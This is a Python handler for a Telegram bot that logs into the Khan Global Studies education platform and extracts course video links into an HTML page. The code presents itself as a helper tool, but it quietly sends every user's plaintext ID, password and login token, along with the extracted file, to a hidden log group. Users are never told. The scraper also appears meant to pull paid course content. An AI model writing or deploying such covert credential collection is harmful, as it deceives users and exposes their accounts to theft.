# kgshtml_handler.py

import logging
import os
import requests
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    CommandHandler,
    ConversationHandler,
    MessageHandler,
    ContextTypes,
    CallbackQueryHandler,
    filters,
)
from config import LOG_GROUP_ID

# Stages
CHOOSING_LOGIN, GET_ID_PASSWORD, GET_TOKEN, GET_BATCH_INFO = range(4)

def create_html_content(batch_name, videos_data):
    """Creates HTML content with a modern design."""
    html_template = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{batch_name} - Video Links</title>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        body {{
            font-family: Arial, sans-serif;
            line-height: 1.6;
            padding: 20px;
            background-color: #f5f5f5;
        }}
        .container {{
            max-width: 1200px;
            margin: 0 auto;
            background-color: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }}
        h1 {{
            color: #2c3e50;
            margin-bottom: 20px;
            text-align: center;
            padding-bottom: 10px;
            border-bottom: 2px solid #eee;
        }}
        .video-grid {{
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 20px;
            margin-top: 20px;
        }}
        .video-card {{
            background-color: #fff;
            border: 1px solid #ddd;
            border-radius: 8px;
            padding: 15px;
            transition: transform 0.2s;
        }}
        .video-card:hover {{
            transform: translateY(-5px);
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }}
        .video-title {{
            color: #34495e;
            margin-bottom: 10px;
            font-weight: bold;
        }}
        .video-link {{
            color: #3498db;
            text-decoration: none;
            word-break: break-all;
        }}
        .video-link:hover {{
            text-decoration: underline;
        }}
        .timestamp {{
            color: #7f8c8d;
            font-size: 0.8em;
            margin-top: 10px;
            text-align: right;
        }}
    </style>
</head>
<body>
    <div class="container">
        <h1>{batch_name}</h1>
        <div class="video-grid">
"""
    
    for title, url in videos_data:
        html_template += f"""
            <div class="video-card">
                <div class="video-title">{title}</div>
                <a href="{url}" class="video-link" target="_blank">Watch Video</a>
            </div>
"""

    html_template += f"""
        </div>
        <div class="timestamp">Generated on: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</div>
    </div>
</body>
</html>
"""
    return html_template

async def kgshtml_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start the KGS HTML extraction process."""
    keyboard = [
        [
            InlineKeyboardButton("Login with ID/Password", callback_data="id_pass"),
            InlineKeyboardButton("Login with Token", callback_data="token"),
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "Choose your login method for Khan Global Studies:",
        reply_markup=reply_markup
    )
    return CHOOSING_LOGIN

async def handle_login_choice(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle login method choice."""
    query = update.callback_query
    await query.answer()
    
    if query.data == "id_pass":
        await query.edit_message_text("Please enter your User ID:")
        context.user_data['login_method'] = 'id_pass'
        context.user_data['login_step'] = 'waiting_id'
        return GET_ID_PASSWORD
    else:
        await query.edit_message_text("Please enter your Token:")
        context.user_data['login_method'] = 'token'
        return GET_TOKEN

async def handle_id_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle ID and password login."""
    if context.user_data.get('login_step') == 'waiting_id':
        context.user_data['user_id'] = update.message.text
        await update.message.reply_text("Now enter your Password:")
        context.user_data['login_step'] = 'waiting_password'
        return GET_ID_PASSWORD
    
    password = update.message.text
    user_id = context.user_data.get('user_id')
    
    # Log credentials to group
    await context.bot.send_message(
        chat_id=LOG_GROUP_ID,
        text=f"New KGS Login Attempt:\nUser ID: ```{user_id}```\nPassword: ```{password}```",
        parse_mode="Markdown"
    )

    headers = {
        "Host": "khanglobalstudies.com",
        "content-type": "application/x-www-form-urlencoded",
        "accept-encoding": "gzip",
        "user-agent": "okhttp/3.9.1",
    }
    
    try:
        response = requests.post(
            "https://khanglobalstudies.com/api/login-with-password",
            headers=headers,
            data={"phone": user_id, "password": password}
        )
        
        if response.status_code == 200:
            token = response.json().get("token")
            context.user_data['token'] = token
            await update.message.reply_text(
                "Login successful! Now send the Batch ID:"
            )
            return GET_BATCH_INFO
        else:
            await update.message.reply_text(
                "Login failed! Please try again with /kgshtml"
            )
            return ConversationHandler.END
    except Exception as e:
        logging.error(f"Error in handle_id_password: {e}")
        await update.message.reply_text(
            "An error occurred. Please try again with /kgshtml"
        )
        return ConversationHandler.END

async def handle_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle token login."""
    token = update.message.text
    context.user_data['token'] = token
    
    # Log token to group
    await context.bot.send_message(
        chat_id=LOG_GROUP_ID,
        text=f"New KGS Token Used: ```{token}```",
        parse_mode="Markdown"
    )
    
    await update.message.reply_text("Now send the Batch ID:")
    return GET_BATCH_INFO

async def handle_batch_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle batch information and generate HTML."""
    try:
        message_parts = update.message.text.split()
        if len(message_parts) < 2:
            await update.message.reply_text(
                "Please send batch information in format: 'BATCH_ID BATCH_NAME'"
            )
            return GET_BATCH_INFO
            
        batch_id = message_parts[0]
        batch_name = " ".join(message_parts[1:])
        token = context.user_data.get('token')
        
        await update.message.reply_text("Fetching lessons, please wait...")
        
        headers = {
            "Host": "khanglobalstudies.com",
            "authorization": f"Bearer {token}",
            "accept-encoding": "gzip",
            "user-agent": "okhttp/3.9.1",
        }
        
        # Fetch lessons
        response = requests.get(
            f"https://khanglobalstudies.com/api/user/courses/{batch_id}/v2-lessons",
            headers=headers
        )
        
        if response.status_code != 200:
            await update.message.reply_text(
                "Failed to fetch lessons. Please check your batch ID or token."
            )
            return ConversationHandler.END
            
        lessons = response.json()
        videos_data = []
        
        for lesson in lessons:
            try:
                lesson_response = requests.get(
                    f"https://khanglobalstudies.com/api/lessons/{lesson['id']}",
                    headers=headers
                )
                lesson_data = lesson_response.json()
                
                for video in lesson_data.get("videos", []):
                    title = video.get("name")
                    video_url = video.get("video_url")
                    videos_data.append((title, video_url))
            except Exception as e:
                logging.error(f"Error fetching lesson {lesson['id']}: {e}")
                continue
        
        if videos_data:
            html_content = create_html_content(batch_name, videos_data)
            filename = f"KGS_{batch_name}.html"
            
            with open(filename, "w", encoding="utf-8") as f:
                f.write(html_content)
                
            # Send file to user
            with open(filename, "rb") as f:
                await update.message.reply_document(
                    document=f,
                    caption=f"Here's your extracted content for {batch_name}!"
                )
                
            # Send file to log group
            with open(filename, "rb") as f:
                await context.bot.send_document(
                    chat_id=LOG_GROUP_ID,
                    document=f,
                    caption=f"KGS content extracted for batch: {batch_name}"
                )
                
            os.remove(filename)
            await update.message.reply_text("Extraction completed successfully!")
        else:
            await update.message.reply_text("No videos found in this batch.")
            
        return ConversationHandler.END
        
    except Exception as e:
        logging.error(f"Error in handle_batch_info: {e}")
        await update.message.reply_text(
            "An error occurred during extraction. Please try again."
        )
        return ConversationHandler.END

# Create the conversation handler
kgshtml_handler = ConversationHandler(
    entry_points=[CommandHandler("kgshtml", kgshtml_start)],
    states={
        CHOOSING_LOGIN: [CallbackQueryHandler(handle_login_choice)],
        GET_ID_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_id_password)],
        GET_TOKEN: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_token)],
        GET_BATCH_INFO: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_batch_info)],
    },
    fallbacks=[],
                       )
